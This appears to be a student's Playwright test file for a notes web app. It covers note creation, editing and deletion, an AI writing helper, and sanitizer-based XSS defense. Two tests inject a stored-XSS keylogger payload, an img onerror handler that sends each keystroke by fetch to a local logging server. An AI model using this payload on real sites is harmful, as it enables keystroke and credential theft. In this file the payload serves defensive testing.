import { test, expect } from '@playwright/test';
import fs from 'fs';
import path from 'path'

// Force Playwright to wait up to 30 seconds for each test
test.setTimeout(30000);

// 1. SEED THE DATABASE BEFORE THE BROWSER OPENS
test.beforeAll(async () => {
  try {
    // Ping the backend directly to create the test user
    await fetch('http://localhost:3001/users', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        name: 'Playwright Tester',
        email: 'testuser1@mail.com',
        username: 'playtestuser1',
        password: '12345'
      })
    });
    // Note: If the user already exists, your backend will reject this, 
    // which is perfectly fine! We just need to ensure they are there.
  } catch (error) {
    console.log("Setup note: Backend might not be running or user exists.");
  }
});

// 1. THIS RUNS BEFORE EVERY SINGLE TEST
test.beforeEach(async ({ page }) => {
  await page.goto('http://localhost:3000');
  
  // Log in so the app is unlocked for the tests
  await page.click('[data-testid="go_to_login_button"]');
  await page.fill('[data-testid="login_form_username"]', 'playtestuser1');
  await page.fill('[data-testid="login_form_password"]', '12345'); 
  await page.click('[data-testid="login_form_login"]');

  // Wait for the login to complete
  await page.locator('button[name="add_new_note"]').waitFor();
});

// ----------------------------------------------------
// HW2 CARRY-OVER TESTS
// ----------------------------------------------------

test('Should create a new note successfully', async ({ page }) => {
  const addButton = page.locator('button[name="add_new_note"]');
  await addButton.click();

  const input = page.locator('input[name="text_input_new_note"]');
  await expect(input).toBeVisible();
  await input.fill('This is a TDD generated note');

  const saveButton = page.locator('button[name="text_input_save_new_note"]');
  await saveButton.click();

  const notification = page.locator('.notification');
  await expect(notification).toHaveText('Added a new note');
});

test('Should read notes successfully', async ({ page }) => {
  const notes = page.locator('.note');
  await expect(notes.first()).toBeVisible();
  
  const count = await notes.count();
  expect(count).toBeGreaterThan(0);
});

test('Should update a note successfully', async ({ page }) => {
  const editButton = page.locator('button[data-testid^="edit-"]').first();
  await expect(editButton).toBeVisible();
  await editButton.click();

  const textarea = page.locator('textarea[data-testid^="text_input-"]').first();
  await expect(textarea).toBeVisible();
  await textarea.fill('This content has been updated via TDD!');

  const saveButton = page.locator('button[data-testid^="text_input_save-"]').first();
  await saveButton.click();

  const notification = page.locator('.notification');
  await expect(notification).toHaveText('Note updated');
});

test('Should delete a note successfully', async ({ page }) => {
  const deleteButton = page.locator('button[data-testid^="delete-"]').first();
  await expect(deleteButton).toBeVisible();
  await deleteButton.click();

  const notification = page.locator('.notification');
  await expect(notification).toHaveText('Note deleted');
});

// ----------------------------------------------------
// HW3 NEW AI TEST
// ----------------------------------------------------

test('AI assistant generates text and appends to new note', async ({ page }) => {

  
  // 1. Click the add_new_note button to open the new-note form
  await page.click('button[name="add_new_note"]');

  // 2. Click help_me_write (The AI Star Button)
  await page.click('[data-testid="help_me_write"]');

  // 3. Type a short prompt into help_me_write_prompt
  await page.fill('[data-testid="help_me_write_prompt"]', 'Write a one sentence summary about the notes.');

  // 4. Capture the note input locator
  const noteInput = page.locator('input[name="text_input_new_note"]');
  
  // Verify the input is currently empty before we generate text
  await expect(noteInput).toHaveValue('');

  // 5. Click help_me_write_submit
  await page.click('[data-testid="help_me_write_submit"]');

  // 6. Assert that within 30 seconds the input grew non-empty
  await expect(noteInput).not.toHaveValue('', { timeout: 30000 });
});

// ----------------------------------------------------
// HW4: Rich Text & XSS Defense Tests
// ----------------------------------------------------

test('Should preserve rich-text rendering safely', async ({ page }) => {
  // 1. Create a note with safe HTML using your app's specific locators
  await page.click('button[name="add_new_note"]');
  await page.fill('input[name="text_input_new_note"]', 'Hello <b>world</b>'); 
  await page.click('button[name="text_input_save_new_note"]'); 

  // 2. Wait for the note to appear and verify the HTML structure
  const noteBody = page.locator('[data-testid="note_body"]').first();
  
  // Assert that the <b> tag was actually rendered as an HTML element
  const boldElement = noteBody.locator('b');
  await expect(boldElement).toHaveCount(1);
  await expect(boldElement).toHaveText('world');
});

test('XSS works when sanitizer is OFF', async ({ page }) => {
  // 1. Define the absolute path to the attacker server log in the root folder
  const logPath = path.join(process.cwd(), '../keylog.txt');
  
  // 2. Reset the log file so we have a clean slate
  fs.writeFileSync(logPath, '');

  // 3. Toggle the sanitizer OFF
  const toggleBtn = page.locator('[data-testid="sanitizer_toggle"]');
  await expect(toggleBtn).toContainText('ON');
  await toggleBtn.click();
  await expect(toggleBtn).toContainText('OFF');

  // 4. Inject the payload using your app's specific locators
  const payload = 'Hack <img src="x" onerror="document.addEventListener(\'keydown\', (e) => fetch(\'http://localhost:4000/log\', { method: \'POST\', body: e.key }))" /> Test';
  await page.click('button[name="add_new_note"]');
  await page.fill('input[name="text_input_new_note"]', payload); 
  await page.click('button[name="text_input_save_new_note"]');

  // 5. Wait a moment for the image to fail loading and the onerror event to bind
  await page.waitForTimeout(500);

  // 6. Type some stolen keys
  await page.keyboard.type('evil');

  // 7. Wait a second for the background fetch() requests to reach the server
  await page.waitForTimeout(1000);

  // 8. Read the log file and assert the attack succeeded
  const logContent = fs.readFileSync(logPath, 'utf8');
  expect(logContent).toContain('e');
  expect(logContent).toContain('v');
  expect(logContent).toContain('i');
  expect(logContent).toContain('l');
});

test('XSS is blocked when sanitizer is ON', async ({ page }) => {
  // 1. Reset the log file again
  const logPath = path.join(process.cwd(), '../keylog.txt');
  fs.writeFileSync(logPath, '');

  // 2. Verify the toggle is ON (it should be on by default after a page refresh/navigation)
  const toggleBtn = page.locator('[data-testid="sanitizer_toggle"]');
  await expect(toggleBtn).toContainText('ON');

  // 3. Inject the exact same payload using your app's specific locators
  const payload = 'Shield <img src="x" onerror="document.addEventListener(\'keydown\', (e) => fetch(\'http://localhost:4000/log\', { method: \'POST\', body: e.key }))" /> Test';
  await page.click('button[name="add_new_note"]');
  await page.fill('input[name="text_input_new_note"]', payload); 
  await page.click('button[name="text_input_save_new_note"]');

  // 4. Wait for render
  await page.waitForTimeout(500);

  // 5. Type some keys that should NOT be stolen
  await page.keyboard.type('safe');

  // 6. Wait to ensure no delayed network requests slip through
  await page.waitForTimeout(1000);

  // 7. Read the log file and assert the defense held (file should be empty)
  const logContent = fs.readFileSync(logPath, 'utf8');
  expect(logContent.trim()).toBe('');
});